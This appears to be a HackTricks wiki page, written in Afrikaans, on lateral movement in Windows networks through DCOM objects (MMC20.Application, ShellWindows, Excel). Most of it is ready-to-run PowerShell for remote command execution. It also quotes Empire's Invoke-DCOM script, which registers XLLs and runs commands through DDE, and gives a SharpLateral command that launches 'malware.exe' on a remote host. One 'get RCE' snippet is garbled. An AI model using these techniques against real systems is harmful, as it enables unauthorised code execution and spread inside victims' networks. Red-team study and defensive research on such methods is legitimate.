# DCOM Exec

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## MMC20.Application

**Vir meer inligting oor hierdie tegniek, kyk die oorspronklike pos van [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Distributed Component Object Model (DCOM) objek bied 'n interessante vermoë vir netwerk-gebaseerde interaksies met objek. Microsoft bied omvattende dokumentasie vir beide DCOM en Component Object Model (COM), beskikbaar [hier vir DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) en [hier vir COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). 'n Lys van DCOM-toepassings kan verkry word met die PowerShell-opdrag:
```bash
Get-CimInstance Win32_DCOMApplication
```
Die COM-objek, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), stel die skripting van MMC-snap-in operasies in staat. Opmerklik is dat hierdie objek 'n `ExecuteShellCommand` metode onder `Document.ActiveView` bevat. Meer inligting oor hierdie metode kan [hier](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx) gevind word. Kontroleer dit wat dit uitvoer:

Hierdie funksie fasiliteer die uitvoering van opdragte oor 'n netwerk deur 'n DCOM-toepassing. Om met DCOM op afstand as 'n admin te kommunikeer, kan PowerShell soos volg gebruik word:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Hierdie opdrag verbind met die DCOM-toepassing en keer 'n instansie van die COM-objek terug. Die ExecuteShellCommand-metode kan dan aangeroep word om 'n proses op die afstandlike gasheer uit te voer. Die proses behels die volgende stappe:

Check methods:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Kry RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Vir meer inligting oor hierdie tegniek, kyk na die oorspronklike pos [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Die **MMC20.Application** objek is geïdentifiseer as dat dit nie eksplisiete "LaunchPermissions" het nie, wat standaard na toestemmings wat Administrators toegang gee, terugval. Vir verdere besonderhede kan 'n draad ondersoek word [hier](https://twitter.com/tiraniddo/status/817532039771525120), en die gebruik van [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET vir die filtrering van objekte sonder eksplisiete Launch Permission word aanbeveel.

Twee spesifieke objekte, `ShellBrowserWindow` en `ShellWindows`, is beklemtoon weens hul gebrek aan eksplisiete Launch Permissions. Die afwesigheid van 'n `LaunchPermission` registrasie-invoer onder `HKCR:\AppID\{guid}` dui op geen eksplisiete toestemmings nie.

###  ShellWindows
Vir `ShellWindows`, wat 'n ProgID ontbreek, fasiliteer die .NET metodes `Type.GetTypeFromCLSID` en `Activator.CreateInstance` objekinstansie met behulp van sy AppID. Hierdie proses benut OleView .NET om die CLSID vir `ShellWindows` te verkry. Sodra dit geïnstantieer is, is interaksie moontlik deur die `WindowsShell.Item` metode, wat lei tot metode-aanroep soos `Document.Application.ShellExecute`.

Voorbeeld PowerShell-opdragte is verskaf om die objek te instansieer en opdragte op afstand uit te voer:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Lateral Movement with Excel DCOM Objects

Laterale beweging kan bereik word deur DCOM Excel-objekte te benut. Vir gedetailleerde inligting, is dit raadsaam om die bespreking oor die benutting van Excel DDE vir laterale beweging via DCOM op [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) te lees.

Die Empire-projek bied 'n PowerShell-skrip, wat die gebruik van Excel vir afstandkode-uitvoering (RCE) demonstreer deur DCOM-objekte te manipuleer. Hieronder is snitte van die skrip beskikbaar op [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), wat verskillende metodes toon om Excel vir RCE te misbruik:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Outomatiseringstoestelle vir Laterale Beweging

Twee toestelle word beklemtoon vir die outomatisering van hierdie tegnieke:

- **Invoke-DCOM.ps1**: 'n PowerShell-skrip wat deur die Empire-projek verskaf word en die oproep van verskillende metodes vir die uitvoering van kode op afstandmasjiene vereenvoudig. Hierdie skrip is beskikbaar by die Empire GitHub-bewaarplek.

- **SharpLateral**: 'n Toestel wat ontwerp is om kode op afstand uit te voer, wat gebruik kan word met die opdrag:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Outomatiese Gereedskap

* Die Powershell-skrip [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) maak dit maklik om al die kommentaar maniere aan te roep om kode op ander masjiene uit te voer.
* Jy kan ook [**SharpLateral**](https://github.com/mertdas/SharpLateral) gebruik:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Verwysings

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
